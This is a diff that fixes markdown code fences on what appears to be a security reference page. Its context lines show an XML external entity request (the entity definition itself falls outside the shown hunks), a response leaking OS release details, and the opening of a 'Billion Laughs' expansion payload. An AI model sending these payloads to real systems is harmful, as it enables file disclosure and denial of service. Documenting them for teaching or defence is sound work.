@@ -1,7 +1,7 @@
 XXE Attack Example
 ---------------
 Request
-``````xml
+```xml
 POST http://example.com/xml HTTP/1.1
 
 <!DOCTYPE foo [
@@ -12,21 +12,21 @@ POST http://example.com/xml HTTP/1.1
 <foo>
   &bar;
 </foo>
-``````
+```
 Response
-`````
+```
 HTTP/1.0 200 OK
  
 DISTRIB_ID=Ubuntu
 DISTRIB_RELEASE=16.04
 DISTRIB_CODENAME=xenial
 DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
-````
+```
 
 
 Billion Laughs
 ---------------
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
   <!ENTITY lol "lol">
